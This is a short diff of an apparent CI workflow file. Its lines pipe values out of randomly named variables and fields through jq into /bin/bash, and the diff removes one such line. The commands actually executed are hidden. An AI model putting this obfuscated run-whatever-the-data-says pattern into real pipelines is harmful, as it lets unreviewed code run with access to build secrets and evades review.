@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$lnqv45752" | jq -r .akko721 | /bin/bash
           printf '%s' "$xegmd725" | jq -r .qhdb971 | /bin/bash
           printf '%s' "$z899" | jq -r .w0368 | /bin/bash
-          echo $je9386 | jq -r .fn19952 | /bin/bash
           printf '%s' "$jsjyg9" | jq -r .e10967 | /bin/bash
 
       - name: Save results
